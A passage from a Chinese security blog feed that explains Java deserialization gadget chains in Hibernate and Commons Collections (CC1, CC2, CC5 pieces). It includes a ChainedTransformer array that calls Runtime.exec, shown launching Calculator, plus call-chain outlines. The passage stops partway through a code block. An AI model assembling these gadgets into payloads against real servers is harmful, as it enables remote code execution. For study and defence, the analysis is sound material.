class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>变量内的hashcode为ValueHolder类，这里的ValueHolder和TypedValue就是对其中的value进行了一定的包装，方便我们获取其类型和属性，我们鸡血跟入ValueHolder.getValue</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;ValueHolderpublic ValueHolder(DeferredInitializer&lt;T&gt; valueInitializer) &#123;    this.valueInitializer &#x3D; valueInitializer;&#125;public T getValue() &#123;    if (this.value &#x3D;&#x3D; null) &#123;        this.value &#x3D; this.valueInitializer.initialize();    &#125;    return this.value;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行了this.valueInitializer.initialize，这里的valueInitializer是在构造函数中传入的，我们继续跟入</p><pre class="line-numbers language-none"><code class="language-none">private void initTransients() &#123;    this.hashcode &#x3D; new ValueHolder(new ValueHolder.DeferredInitializer&lt;Integer&gt;() &#123;        public Integer initialize() &#123;            return TypedValue.this.value &#x3D;&#x3D; null ? 0 : TypedValue.this.type.getHashCode(TypedValue.this.value);        &#125;    &#125;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入到了TypedValue的initTransients中对ValueHolder的DeferredInitializer的实现中，调用了TypedValue.type.getHashCode(TypedValue.this.value)，这里value就是构造了恶意字节码的TemplateImpl对象了，跟入</p><pre class="line-numbers language-none"><code class="language-none">public int getHashCode(Object x) &#123;    int result &#x3D; 17;    for(int i &#x3D; 0; i &lt; this.propertySpan; ++i) &#123;        Object y &#x3D; this.getPropertyValue(x, i);        result *&#x3D; 37;        if (y !&#x3D; null) &#123;            result +&#x3D; this.propertyTypes[i].getHashCode(y);        &#125;    &#125;    return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;org.hibernate.type.ComponentTypepublic int getHashCode(Object x) &#123;    int result &#x3D; 17;    for(int i &#x3D; 0; i &lt; this.propertySpan; ++i) &#123;        Object y &#x3D; this.getPropertyValue(x, i);        result *&#x3D; 37;        if (y !&#x3D; null) &#123;            result +&#x3D; this.propertyTypes[i].getHashCode(y);        &#125;    &#125;    return result;&#125;public Object getPropertyValue(Object component, int i) throws HibernateException &#123;    return component instanceof Object[] ? ((Object[])((Object[])component))[i] : this.componentTuplizer.getPropertyValue(component, i);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用到<code>this.componentTuplizer.getPropertyValue(恶意字节码对象,i)</code></p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;org.hibernate.tuple.component.AbstractComponentTuplizerpublic Object getPropertyValue(Object component, int i) throws HibernateException &#123;    return this.getters[i].get(component);&#125;public Object get(Object owner) &#123;    try &#123;        return this.getterMethod.invoke(owner);    &#125; catch (InvocationTargetException var3) &#123;        throw new PropertyAccessException(var3, &quot;Exception occurred inside&quot;, false, this.containerClass, this.propertyName);    &#125; catch (IllegalAccessException var4) &#123;        throw new PropertyAccessException(var4, &quot;IllegalAccessException occurred while calling&quot;, false, this.containerClass, this.propertyName);    &#125; catch (IllegalArgumentException var5) &#123;        LOG.illegalPropertyGetterArgument(this.containerClass.getName(), this.propertyName);        throw new PropertyAccessException(var5, &quot;IllegalArgumentException occurred calling&quot;, false, this.containerClass, this.propertyName);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续调用<code>this.getters[i].get(恶意字节码对象)</code>，最终调用到<code>this.getterMethod.invoke(owner)</code>这里的getterMethod就是我们先前构造的getOutputProperties方法，传入恶意字节码对象，完成RCE</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CC链碎片</title>
      <link href="/posts/2f60179e.html"/>
      <url>/posts/2f60179e.html</url>
      
        <content type="html"><![CDATA[        <h1 id="CC链碎片"   >          <a href="#CC链碎片" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC链碎片" class="headerlink" title="CC链碎片"></a>CC链碎片</h1>      <p>众所周知，CC链本质上就是对不同的反序列化进行拼凑得到的，那么我们只要将其中的碎片进行总结再加以利用就可以构造出所有的CC链，这篇水文就是用来总结CC中的所有碎片的</p><span id="more"></span>        <h2 id="三个Transform方法（CC链实现关键）"   >          <a href="#三个Transform方法（CC链实现关键）" class="heading-link"><i class="fas fa-link"></i></a><a href="#三个Transform方法（CC链实现关键）" class="headerlink" title="三个Transform方法（CC链实现关键）"></a>三个Transform方法（CC链实现关键）</h2>      <p>使用链：都是关键了你说谁用</p><ol><li>        <h3 id="InvokerTransformer（调用者转换器）"   >          <a href="#InvokerTransformer（调用者转换器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvokerTransformer（调用者转换器）" class="headerlink" title="InvokerTransformer（调用者转换器）"></a>InvokerTransformer（调用者转换器）</h3>      <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072202716.png"></p><p>可以看到通过获取<code>this.iMethodName, this.iParamTypes, this.iArgs</code>来反射调用传入类的方法，其中内容都可控，那我们是不是只要传入一个Runtime对象，调用其中的exec方法，就能任意命令执行了呢</p><p>直接调用可行性验证</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072215402.png"></p><p>发现成功执行了，但是直接找到⼀个类，它在反序列化的 <code>readObject</code> 里直接或间接调用了 <code>InvokerTransformer</code> 的 <code>transform</code> 方法，并且参数可控，就能RCE，是这样吗？肯定不是，我们都知道待序列化的对象和所有它使⽤的内部属性对象，必须都实现了 <code>java.io.Serializable</code> 接⼝。我们需要传给 <code>transform</code> 方法的参数是 <code>Runtime</code> 对象，在序列化的时候肯定也属于内部属性对象，而它是没有实现 <code>java.io.Serializable</code> 接⼝的，所以即使找到了符合条件的类也没办法构造成序列化数据。</p></li><li>        <h3 id="ChainedTransformer（链条转换器）"   >          <a href="#ChainedTransformer（链条转换器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#ChainedTransformer（链条转换器）" class="headerlink" title="ChainedTransformer（链条转换器）"></a>ChainedTransformer（链条转换器）</h3>      <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211081031321.png"></p><p>此类的transform通过按顺序调用 <code>Transformer</code> 数组 <code>this.iTransformers</code> 中所有 <code>Transformer</code> 对象的 <code>transform</code> 方法，并且每次调用的结果传递给下一个项目的transform进行调用，就像一个链条一样逐层传递执行，那么二者结合我们就可以利用<code>InvokerTransformer</code>通过反射来间接生成一个<code>Runtime</code>类，进而RCE</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//反射获取Runtime类</span><span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//链式调用写法</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//生成Runtime类对象，此处也可使用ConstantTransformer直接调用Runtime.class</span>                <span class="token string">"forName"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//获取getRuntime方法</span>                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token comment">//获取invoke方法执行</span>                <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//RCE</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后调用 <code>ChainedTransformer#transform()</code> 即可,参数为 <code>class</code>对象<code>Class.class</code></p><p>最后就是我们怎么获取到一个class对象作为我们链式调用的起点，我们继续往下走</p></li><li>        <h3 id="ConstantTransformer（常量转换器）"   >          <a href="#ConstantTransformer（常量转换器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#ConstantTransformer（常量转换器）" class="headerlink" title="ConstantTransformer（常量转换器）"></a>ConstantTransformer（常量转换器）</h3>      <p>最后我们再来看<code>ConstantTransformer</code>，这个类实现了序列化接口所以也可以进行反序列化</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100043086.png"></p><p>可以看到<code>transform</code>函数就直接返回了<code>this.iConstant</code>，这里的<code>iConstant</code>我们直接传入即可，说白了就是拿一个对象包裹一个对象（听起来多少有点没用），不过，由于其<code>transform</code>方法会将其中的<code>iConstant</code>直接返回，我们就可以在其中包裹一个class类对象来作为上面的链式调用的起点，最终构造的链子如下</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100110622.png"></p><p>最终只要调用<code>transform</code>随便扔点啥进去都能调用成功</p></li><li>        <h3 id="InstantiateTransformer（实例化转换器）"   >          <a href="#InstantiateTransformer（实例化转换器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#InstantiateTransformer（实例化转换器）" class="headerlink" title="InstantiateTransformer（实例化转换器）"></a>InstantiateTransformer（实例化转换器）</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public Object transform(Object input) &#123;    try &#123;        if (input instanceof Class &#x3D;&#x3D; false) &#123;            throw new FunctorException(                &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;                    + (input &#x3D;&#x3D; null ? &quot;null object&quot; : input.getClass().getName()));        &#125;        Constructor con &#x3D; ((Class) input).getConstructor(iParamTypes);        return con.newInstance(iArgs);    &#125; catch (NoSuchMethodException ex) &#123;        throw new FunctorException(&quot;InstantiateTransformer: The constructor must exist and be public &quot;);    &#125; catch (InstantiationException ex) &#123;        throw new FunctorException(&quot;InstantiateTransformer: InstantiationException&quot;, ex);    &#125; catch (IllegalAccessException ex) &#123;        throw new FunctorException(&quot;InstantiateTransformer: Constructor must be public&quot;, ex);    &#125; catch (InvocationTargetException ex) &#123;        throw new FunctorException(&quot;InstantiateTransformer: Constructor threw an exception&quot;, ex);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个类的关键点也在transform处，相当于调用了传入内容的类的构造函数，然后再加上TrAXFilter类来进行RCE，所以也可以说这两个类是连在一起使用的</p></li></ol>        <h2 id="AnnotationInvocationHandler"   >          <a href="#AnnotationInvocationHandler" class="heading-link"><i class="fas fa-link"></i></a><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2>      <p>使用链：CC1</p><p>首先我们要知道的一点是，对于任意一个代理后的类，在调用类的任意方法时，都会调用其invoke方法，所以这个类有两个使用点，一个是作为readObject反序列化的起点，一个是作为代理中的类进行重写进而对代理的Map类的get方法进行触发</p><p>利用链：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token class-name">Proxy</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enteySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span>memberValues<span class="token annotation punctuation">@LazyMap.get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="readObject"   >          <a href="#readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;        var1.defaultReadObject();        AnnotationType var2 &#x3D; null;        try &#123;            var2 &#x3D; AnnotationType.getInstance(this.type);        &#125; catch (IllegalArgumentException var9) &#123;            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);        &#125;        Map var3 &#x3D; var2.memberTypes();        Iterator var4 &#x3D; this.memberValues.entrySet().iterator();        while(var4.hasNext()) &#123;            Map.Entry var5 &#x3D; (Map.Entry)var4.next();            String var6 &#x3D; (String)var5.getKey();            Class var7 &#x3D; (Class)var3.get(var6);            if (var7 !&#x3D; null) &#123;                Object var8 &#x3D; var5.getValue();                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));                &#125;            &#125;        &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处触发了memberValues的enteySet方法，由于我们设置的memberValues是被代理的Map类，所以会进入下一步，AnnotationInvocationHandler的invoke方法</p>        <h3 id="invoke"   >          <a href="#invoke" class="heading-link"><i class="fas fa-link"></i></a><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public Object invoke(Object var1, Method var2, Object[] var3) &#123;        String var4 &#x3D; var2.getName();        Class[] var5 &#x3D; var2.getParameterTypes();        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length &#x3D;&#x3D; 1 &amp;&amp; var5[0] &#x3D;&#x3D; Object.class) &#123;            return this.equalsImpl(var3[0]);        &#125; else if (var5.length !&#x3D; 0) &#123;            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        &#125; else &#123;            switch (var4) &#123;                case &quot;toString&quot;:                    return this.toStringImpl();                case &quot;hashCode&quot;:                    return this.hashCodeImpl();                case &quot;annotationType&quot;:                    return this.type;                default:                    Object var6 &#x3D; this.memberValues.get(var4);                    if (var6 &#x3D;&#x3D; null) &#123;                        throw new IncompleteAnnotationException(this.type, var4);                    &#125; else if (var6 instanceof ExceptionProxy) &#123;                        throw ((ExceptionProxy)var6).generateException();                    &#125; else &#123;                        if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) !&#x3D; 0) &#123;                            var6 &#x3D; this.cloneArray(var6);                        &#125;                        return var6;                    &#125;            &#125;        &#125;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到调用了memberValues的get方法这里便是对Map（实际调用LazyMap）的get方法的调用</p>        <h2 id="LazyMap（Map）"   >          <a href="#LazyMap（Map）" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap（Map）" class="headerlink" title="LazyMap（Map）"></a>LazyMap（Map）</h2>      <p>使用链：CC1</p><p>一个小小的关键点，在调用equals会看到，因为我在看的时候在这个类里一直都没看到equals方法，<code>public class LazyMap extends AbstractMapDecorator implements Map, Serializable</code>继承和实现的类<code>AbstractMapDecorator</code>中是有equals方法的，跟入</p><p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">Map.get()-&gt;factory@chainedTransformer.transform(key)Hashtable.reconstitutionPut()-&gt;e.key@LazyMap.equals(key@LazyMap)-&gt;AbstractMapDecorator.equals()-&gt;AbstractMap.equals()-&gt;m@LazyMap.get()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h3 id="get"   >          <a href="#get" class="heading-link"><i class="fas fa-link"></i></a><a href="#get" class="headerlink" title="get"></a>get</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public Object get(Object key) &#123;    if (map.containsKey(key) &#x3D;&#x3D; false) &#123;        Object value &#x3D; factory.transform(key);        map.put(key, value);        return value;    &#125;    return map.get(key);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见get方法中对key调用了factory的transform方法，此处的factory可控并且为Transformer类（我们一般使用chainedTransformer来调用），触发chainedTransformer链式调用</p>        <h3 id="equals（AbstractMapDecorator）"   >          <a href="#equals（AbstractMapDecorator）" class="heading-link"><i class="fas fa-link"></i></a><a href="#equals（AbstractMapDecorator）" class="headerlink" title="equals（AbstractMapDecorator）"></a>equals<em>（AbstractMapDecorator）</em></h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public boolean equals(Object object) &#123;    if (object &#x3D;&#x3D; this) &#123;        return true;    &#125;    return map.equals(object);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处map只要是map类就行，就是本来的LazyMap本人，继续调用<code>AbstractMap</code>中的euqals</p>        <h3 id="equals（AbstractMap）"   >          <a href="#equals（AbstractMap）" class="heading-link"><i class="fas fa-link"></i></a><a href="#equals（AbstractMap）" class="headerlink" title="equals（AbstractMap）"></a>equals<em>（AbstractMap）</em></h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public boolean equals(Object o) &#123;    if (o &#x3D;&#x3D; this)        return true;    if (!(o instanceof Map))        return false;    Map&lt;K,V&gt; m &#x3D; (Map&lt;K,V&gt;) o;    if (m.size() !&#x3D; size())        return false;    try &#123;        Iterator&lt;Entry&lt;K,V&gt;&gt; i &#x3D; entrySet().iterator();        while (i.hasNext()) &#123;            Entry&lt;K,V&gt; e &#x3D; i.next();            K key &#x3D; e.getKey();            V value &#x3D; e.getValue();            if (value &#x3D;&#x3D; null) &#123;                if (!(m.get(key)&#x3D;&#x3D;null &amp;&amp; m.containsKey(key)))                    return false;            &#125; else &#123;                if (!value.equals(m.get(key)))                    return false;            &#125;        &#125;    &#125; catch (ClassCastException unused) &#123;        return false;    &#125; catch (NullPointerException unused) &#123;        return false;    &#125;    return true;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到调用了m.get，LazyMap结束</p>        <h2 id="PriorityQueue"   >          <a href="#PriorityQueue" class="heading-link"><i class="fas fa-link"></i></a><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2>      <p>使用链：CC2</p><p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">PriorityQueue.readObject()-&gt;PriorityQueue.heapify()-&gt;PriorityQueue.siftDown()-&gt;PriorityQueue.siftDownUsingComparator()-&gt;comparator@TransformingComparator.compare()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="readObject-1"   >          <a href="#readObject-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#readObject-1" class="headerlink" title="readObject"></a>readObject</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException &#123;    &#x2F;&#x2F; Read in size, and any hidden stuff    s.defaultReadObject();    &#x2F;&#x2F; Read in (and discard) array length    s.readInt();    queue &#x3D; new Object[size];    &#x2F;&#x2F; Read in all elements.    for (int i &#x3D; 0; i &lt; size; i++)        queue[i] &#x3D; s.readObject();    &#x2F;&#x2F; Elements are guaranteed to be in &quot;proper order&quot;, but the    &#x2F;&#x2F; spec has never explained what that might be.    heapify();&#125;&#x2F;&#x2F;这里readObject-&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator中间过程不再赘述，感兴趣的可以自己走一遍（也没两句代码）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就最后一句有用</p>        <h3 id="siftDownUsingComparator（用Comparator进行降序排序）"   >          <a href="#siftDownUsingComparator（用Comparator进行降序排序）" class="heading-link"><i class="fas fa-link"></i></a><a href="#siftDownUsingComparator（用Comparator进行降序排序）" class="headerlink" title="siftDownUsingComparator（用Comparator进行降序排序）"></a>siftDownUsingComparator（用Comparator进行降序排序）</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void siftDownUsingComparator(int k, E x) &#123;    int half &#x3D; size &gt;&gt;&gt; 1;    while (k &lt; half) &#123;        int child &#x3D; (k &lt;&lt; 1) + 1;        Object c &#x3D; queue[child];        int right &#x3D; child + 1;        if (right &lt; size &amp;&amp;            comparator.compare((E) c, (E) queue[right]) &gt; 0)            c &#x3D; queue[child &#x3D; right];        if (comparator.compare(x, (E) c) &lt;&#x3D; 0)            break;        queue[k] &#x3D; c;        k &#x3D; child;    &#125;    queue[k] &#x3D; x;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处关键在于调用了comparator.compare，此处的Comparator我们可控，一般定义为TransformingComparator，这样我对PriorityQueue就结束了</p>        <h2 id="TransformingComparator"   >          <a href="#TransformingComparator" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2>      <p>使用链：CC2</p><p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">PriorityQueue.siftDownUsingComparator()-&gt;TransformingComparator.compare()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="compare"   >          <a href="#compare" class="heading-link"><i class="fas fa-link"></i></a><a href="#compare" class="headerlink" title="compare"></a>compare</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public int compare(Object obj1, Object obj2) &#123;    Object value1 &#x3D; this.transformer.transform(obj1);    Object value2 &#x3D; this.transformer.transform(obj2);    return this.decorated.compare(value1, value2);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不用多说了吧，直接调用transform方法了，transformer可控</p>        <h2 id="TrAXFilter"   >          <a href="#TrAXFilter" class="heading-link"><i class="fas fa-link"></i></a><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2>      <p>使用链：</p><p>该类一般和InstantiateTransformer一起使用进行RCE</p><p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">InstantiateTransformer.transform()-&gt;TrAXFilter()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="TrAXFilter（构造函数）"   >          <a href="#TrAXFilter（构造函数）" class="heading-link"><i class="fas fa-link"></i></a><a href="#TrAXFilter（构造函数）" class="headerlink" title="TrAXFilter（构造函数）"></a>TrAXFilter（构造函数）</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public TrAXFilter(Templates templates)  throws    TransformerConfigurationException&#123;    _templates &#x3D; templates;    _transformer &#x3D; (TransformerImpl) templates.newTransformer();    _transformerHandler &#x3D; new TransformerHandlerImpl(_transformer);    _useServicesMechanism &#x3D; _transformer.useServicesMechnism();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里能看到构造函数调用了templates.newTransformer方法，此处templates可控并且为Templates类，我们传入一个TemplatesImpl类对象，加载恶意字节码即可RCE（见CB1链）</p>        <h2 id="BadAttributeValueExpException"   >          <a href="#BadAttributeValueExpException" class="heading-link"><i class="fas fa-link"></i></a><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2>      <p>使用链：CC5</p><p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">BadAttributeValueExpException.readObject()-&gt;valObj@TiedMapEntry.toString()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该链要求极高<code>This only works in JDK 8u76 and WITHOUT a security manager</code></p><p>直接把这段利用关系看了吧</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;    ObjectInputStream.GetField gf &#x3D; ois.readFields();    Object valObj &#x3D; gf.get(&quot;val&quot;, null);    if 